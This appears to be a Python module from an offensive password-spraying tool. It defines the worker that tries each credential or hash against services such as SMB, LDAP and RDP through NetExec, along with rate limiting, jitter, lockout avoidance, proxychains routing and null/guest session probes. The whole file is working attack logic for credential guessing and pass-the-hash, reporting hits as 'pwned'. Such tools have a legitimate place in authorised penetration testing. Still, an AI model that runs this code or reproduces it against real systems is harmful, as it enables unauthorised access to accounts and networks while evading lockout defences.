"""The spray worker: one function run per credential attempt, plus the rate gate
and the null/guest pre-flight probes."""

import random
import threading
import time

from . import state
from . import ui
from .parsing import banner, explain_output, parse_output
from .protocols import NATIVE_PROTOCOLS
from .results import record_result
from .runners import run_native, run_nxc, validate_access
from .theme import (BOLD, DIM, GRAY, RED, RESET, YELLOW,
                    G_ERR, G_INFO, G_LOCK, G_SKIP, G_WARN, gradient_text, rule)


def rate_gate(rate):
    """Global token-bucket: cap attempts to `rate` per second across all threads."""
    if not rate:
        return
    with state.rate_lock:
        now  = time.time()
        slot = max(now, state.rate_state["next"])
        wait = slot - now
        state.rate_state["next"] = slot + 1.0 / rate
    if wait > 0:
        time.sleep(wait)


def spray_one(proto, target, user, secret, is_hash, logfile, args):
    """Run (and record) a single proto/target/user/secret attempt."""
    if state.abort.is_set():
        return

    tid = threading.get_ident()
    with state.active_lock:
        state.active[tid] = f"{proto}  {user}@{target}"

    quiet          = getattr(args, "quiet", False)
    label          = f"{proto:<6} {target:<15} {user}"
    secret_display = secret if not is_hash else f"(hash:{secret[:16]}…)"

    try:
        with state.locked_lock:
            if user in state.locked_users:
                return

        key = f"{proto}:{target}:{user}:{secret}"
        with state.seen_lock:
            if key in state.seen:
                return
            state.seen.add(key)

        # per-account attempt cap (lockout safety)
        if args.max_attempts:
            with state.user_att_lock:
                if state.user_attempts.get(user, 0) >= args.max_attempts:
                    record_result(logfile, "skip", proto, target, user, secret_display,
                                  f"max-attempts ({args.max_attempts}) reached")
                    return
                state.user_attempts[user] = state.user_attempts.get(user, 0) + 1

        verbose = getattr(args, "verbose", False) and not quiet

        if proto in NATIVE_PROTOCOLS and is_hash:
            record_result(logfile, "skip", proto, target, user, "(hash)",
                          "hash auth unsupported for native protocol")
            if verbose:
                ui.cprint(f"  {G_SKIP} {GRAY}{label}  hash unsupported here{RESET}")
            return

        if proto in NATIVE_PROTOCOLS and args.proxychains:
            record_result(logfile, "skip", proto, target, user, secret_display,
                          "native protocol cannot route through proxychains")
            if verbose:
                ui.cprint(f"  {G_SKIP} {GRAY}{label}  skipped (native, no proxychains){RESET}")
            return

        rate_gate(args.rate)
        if args.jitter:
            time.sleep(random.uniform(*args.jitter))

        if proto in NATIVE_PROTOCOLS:
            output, err = run_native(proto, target, user, secret, args.timeout)
        else:
            output, err = run_nxc(proto, target, user, secret, is_hash,
                                  args.local_auth, args.timeout, args.proxychains)

        # nxc prints a usage dump when a build lacks the requested protocol —
        # turn that noise into a clean error instead of recording the help text.
        if not err and output and ("usage: nxc" in output or "invalid choice" in output):
            err, output = "protocol not supported by this nxc build", ""

        if err:
            record_result(logfile, "error", proto, target, user, secret_display, err, output)
            if verbose:
                ui.cprint(f"  {GRAY}{G_ERR} {label}  {err}{RESET}")
            return

        status = parse_output(proto, output)
        cred   = f"{proto:<6} {target:<15} {BOLD}{user}:{secret_display}{RESET}"

        if status == "locked":
            with state.locked_lock:
                state.locked_users.add(user)
            record_result(logfile, "locked", proto, target, user, secret_display,
                          "account locked out — skipping user", output)
            ui.cprint(f"  {RED}{G_LOCK} {label}  locked out — account skipped{RESET}", bold=True)
            return

        if status == "must_change":
            record_result(logfile, "must_change", proto, target, user,
                          secret_display, "valid — password must change", output)
            ui.cprint(f"  {YELLOW}{G_WARN} {cred}{YELLOW}  {DIM}password must change{RESET}", bold=True)
            return

        if status in ("pwned", "valid"):
            is_access = status == "pwned"
            msg       = ""

            if status == "valid" and args.validate and proto not in NATIVE_PROTOCOLS:
                if args.max_attempts:   # the extra auth counts toward the cap
                    with state.user_att_lock:
                        state.user_attempts[user] = state.user_attempts.get(user, 0) + 1
                ok, msg   = validate_access(proto, target, user, secret, is_hash, args.timeout)
                is_access = ok

            if args.only_access and not is_access:
                return

            detail = banner(output)
            if msg:
                detail = f"{detail}  ·  {msg}" if detail else msg
            rec = record_result(logfile, "pwned" if is_access else "valid",
                                proto, target, user, secret_display,
                                detail or "authenticated", output)
            ui.cprint_hit(rec, is_access)
            return

        # status == "fail" — always recorded (one tidy line); terminal only with --explain
        reasons = explain_output(output or "")
        record_result(logfile, "fail", proto, target, user, secret_display,
                      reasons[0] if reasons else "authentication failed", output)
        if (args.explain or getattr(args, "verbose", False)) and reasons and not quiet:
            ui.cprint(f"  {GRAY}{G_INFO} {label}  {', '.join(reasons)}{RESET}")

    finally:
        with state.counter_lock:
            state.counter["done"] += 1
        with state.active_lock:
            state.active.pop(tid, None)
        ui.redraw()


def preflight_checks(protocols, targets, args, logfile):
    """Quick anonymous / guest session probes before the real spray."""
    probes = []
    if args.null:
        probes.append(("", "", "null session"))
    if args.guest:
        probes.append(("guest", "", "guest / blank"))
    if not probes:
        return

    checkable = [p for p in protocols if p in ("smb", "ldap", "rdp")]
    if not checkable:
        return

    ui.cprint(f"\n{gradient_text('▎ pre-flight')} {rule(26 - 10)}")
    for target in targets:
        for proto in checkable:
            for user, pw, note in probes:
                output, err = run_nxc(proto, target, user, pw, False,
                                      args.local_auth, args.timeout, args.proxychains)
                if err or (output and ("usage: nxc" in output or "invalid choice" in output)):
                    continue
                status = parse_output(proto, output)
                disp = user or "(null)"
                if status in ("pwned", "valid"):
                    rec = record_result(logfile, "valid", proto, target, disp,
                                        pw or "(blank)", f"{note} allowed · {banner(output)}", output)
                    ui.cprint_hit(rec, status == "pwned")
                elif getattr(args, "verbose", False) and not args.quiet:
                    ui.cprint(f"  {GRAY}{G_INFO} {proto:<6} {target:<15} {disp}  {note} refused{RESET}")
